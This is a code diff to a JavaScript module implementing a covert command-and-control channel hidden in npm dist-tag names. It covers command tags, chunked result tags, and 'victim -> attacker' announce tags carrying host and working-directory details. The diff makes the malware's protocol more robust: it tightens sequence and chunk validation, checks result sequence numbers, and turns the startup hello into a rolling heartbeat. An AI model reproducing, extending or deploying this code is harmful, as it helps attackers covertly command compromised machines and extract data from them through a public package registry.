@@ -74,6 +74,19 @@ function validateSeq(seq) {
   }
 }
 
+function decodeSeq(seqStr, tagKind, name) {
+  if (!/^\d+$/.test(seqStr)) {
+    throw new ProtocolError(`malformed ${tagKind} tag (bad seq): "${name}"`);
+  }
+  const seq = Number(seqStr);
+  if (!Number.isSafeInteger(seq) || seq < 1) {
+    throw new ProtocolError(
+      `malformed ${tagKind} tag (seq must be a positive safe integer): "${name}"`,
+    );
+  }
+  return seq;
+}
+
 /** Every tag we emit must satisfy npm's dist-tag name rules. */
 export function assertValidTagName(name) {
   if (name.length > MAX_TAG_LEN) {
@@ -134,14 +147,12 @@ export function decodeCommandTag(name) {
   } catch {
     throw new ProtocolError(`malformed command tag (bad agentId): "${name}"`);
   }
-  if (!/^\d+$/.test(seqStr)) {
-    throw new ProtocolError(`malformed command tag (bad seq): "${name}"`);
-  }
+  const seq = decodeSeq(seqStr, 'command', name);
   const payload = decodePayload(b64);
   if (typeof payload !== 'object' || payload === null || typeof payload.op !== 'string') {
     throw new ProtocolError(`command payload missing "op": "${name}"`);
   }
-  return { agentId, seq: Number(seqStr), payload };
+  return { agentId, seq, payload };
 }
 
 // ---------------------------------------------------------------------------
@@ -215,9 +226,7 @@ export function decodeResultTag(name) {
   } catch {
     throw new ProtocolError(`malformed result tag (bad agentId): "${name}"`);
   }
-  if (!/^\d+$/.test(seqStr)) {
-    throw new ProtocolError(`malformed result tag (bad seq): "${name}"`);
-  }
+  const seq = decodeSeq(seqStr, 'result', name);
   const m = CHUNK_SPEC_RE.exec(spec);
   if (!m) {
     throw new ProtocolError(`malformed result tag (bad chunk spec): "${name}"`);
@@ -227,10 +236,13 @@ export function decodeResultTag(name) {
   }
   const chunk = Number(m[1]);
   const total = Number(m[2]);
+  if (!Number.isSafeInteger(chunk) || !Number.isSafeInteger(total)) {
+    throw new ProtocolError(`malformed result tag (chunk values must be safe integers): "${name}"`);
+  }
   if (chunk < 1 || total < 1 || chunk > total) {
     throw new ProtocolError(`malformed result tag (chunk out of range): "${name}"`);
   }
-  return { agentId, seq: Number(seqStr), chunk, total, data };
+  return { agentId, seq, chunk, total, data };
 }
 
 /**
@@ -254,15 +266,19 @@ export function reassembleResult(parts) {
     throw new ProtocolError(`incomplete result: have ${seen.size} of ${total} chunks`);
   }
   const data = [...parts].sort((a, b) => a.chunk - b.chunk).map((p) => p.data).join('');
-  return decodePayload(data);
+  const payload = decodePayload(data);
+  if (!payload || typeof payload !== 'object' || payload.seq !== seq) {
+    throw new ProtocolError('result payload sequence mismatch');
+  }
+  return payload;
 }
 
 // ---------------------------------------------------------------------------
-// announce tags (victim -> attacker hello, published once at startup)
+// announce tags (victim -> attacker rolling presence heartbeat)
 // ---------------------------------------------------------------------------
 
 /**
- * Encode a startup announce into a single dist-tag name.
+ * Encode a presence heartbeat into a single dist-tag name.
  * @param {string} agentId
  * @param {object} payload e.g. { ts: 123, cwd: '/tmp', host: 'vm1' }
  * @returns {string} tag name
